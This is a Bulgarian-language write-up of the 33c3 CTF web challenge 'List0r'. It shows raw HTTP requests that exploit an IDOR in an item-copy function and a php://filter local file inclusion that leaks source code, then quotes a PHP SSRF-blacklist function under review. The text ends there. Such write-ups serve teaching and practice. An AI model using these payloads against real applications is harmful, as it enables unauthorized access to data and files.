# **List0r** - 400 точки
**33c3ctf/web**

![](files/header.png)


отдалечен уеб сървър: http://78.46.224.80/

Първата уязвима функция която открих се намира във функцията за копиране на item от list-овете който можем да създаваме. 

![](files/copy_function.png)

Уязвимоста ни позволява да правим хоризонтални ескалаций в правата и да копираме чужд item в наш list. 

```
GET /?target=<int(4453)-ID на нашия list>&page=item&action=copy&item=<int-номер на item който искаме да копираме в нашия лист> HTTP/1.1
Host: 78.46.224.80
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8
Cookie: PHPSESSID=bh3hcnmsltvp97oaobcivap6g7
Connection: close
```

Направих бързо енумериране(и прехвърляне) на 1вите създаде items и ето че този с номер 5 ни издава нещо интересно:

![](files/item_hint.png)

Оказва се обаче че файлът - **reeeaally/reallyy/c00l/and_aw3sme_flag**, не може да бъде достъпен директно с GET заявка към сървъра. 

Файлът трябва да бъде достъпен през localhost

```
403 - Sorry, but this is only accessible from 127.0.0.1
```

Явно трябва да има още уязвими функций по пътя. Такива че да можем да направим  **Local File Inclusion**(LFI)

Такава уязвимост успях да намеря отново посредством **PHP филтри** в:

```
GET /?page=php://filter/convert.base64-encode/resource=index HTTP/1.1
Host: 78.46.224.80
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8
Cookie: PHPSESSID=bh3hcnmsltvp97oaobcivap6g7
Connection: close
```

Макар и да **НЕ** можем да достъпим флагът през тази функция успяваме да изтеглим всички релевантни за web апликацият [*.php файлове](files/source_code_p400.tar.gz) от сървъра. Забиваме поглед в сорс-кода и му правивм ревю за други уязвимости.

Файлът който представлява най-голям интерес е **functions.php** и по-специално функцията **get_contents($url)**:

```
function get_contents($url) {
        $disallowed_cidrs = [ "127.0.0.1/24", "169.254.0.0/16", "0.0.0.0/8" ];

        do {
            $url_parts = parse_url($url);

            if (!array_key_exists("host", $url_parts)) {
                die("<p><h3 style=color:red>There was no host in your url!</h3></p>");
            }

            $host = $url_parts["host"];

            if (filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
                $ip = $host;
            } else {
                $ip = dns_get_record($host, DNS_A);
                if (count($ip) > 0) {
                    $ip = $ip[0]["ip"];
                    debug("Resolved to {$ip}");
                } else {
                    die("<p><h3 style=color:red>Your host couldn't be resolved man...</h3></p>");
                }
            }

            foreach ($disallowed_cidrs as $cidr) {
                if (in_cidr($cidr, $ip)) {
                    die("<p><h3 style=color:red>That IP is a blacklisted cidr ({$cidr})!</h3></p>");
                }
            }

            // all good, curl now
            debug("Curling {$url}");
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_MAXREDIRS, 0);
            curl_setopt($curl, CURLOPT_TIMEOUT, 3);
            curl_setopt($curl, CURLOPT_PROTOCOLS, CURLPROTO_ALL 
                & ~CURLPROTO_FILE 
                & ~CURLPROTO_SCP); // no files plzzz
            curl_setopt($curl, CURLOPT_RESOLVE, array($host.":".$ip)); // no dns rebinding plzzz

            $data = curl_exec($curl);

            if (!$data) {
                die("<p><h3 style=color:red>something went wrong....</h3></p>");
            }

            if (curl_error($curl) && strpos(curl_error($curl), "timed out")) {
                die("<p><h3 style=color:red>Timeout!! thats a slowass  server</h3></p>");
            }

            // check for redirects
            $status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
            if ($status >= 301 and $status <= 308) {
                $url = curl_getinfo($curl, CURLINFO_REDIRECT_URL);
            } else {
                return $data;
            }

        } while (1);
    }
```
